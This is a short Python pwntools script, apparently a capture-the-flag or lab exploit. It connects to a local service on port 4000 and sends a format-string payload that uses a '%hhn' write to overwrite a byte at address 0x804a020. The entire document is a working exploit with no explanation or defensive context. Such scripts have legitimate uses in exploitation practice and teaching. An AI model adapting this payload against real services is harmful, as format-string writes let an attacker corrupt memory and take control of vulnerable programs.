from pwn import *

r = remote('127.0.0.1',4000)

raw_input('#')

r.sendline(p32(0x804a020)+'%75c%7$hhn')
print (r.recv())
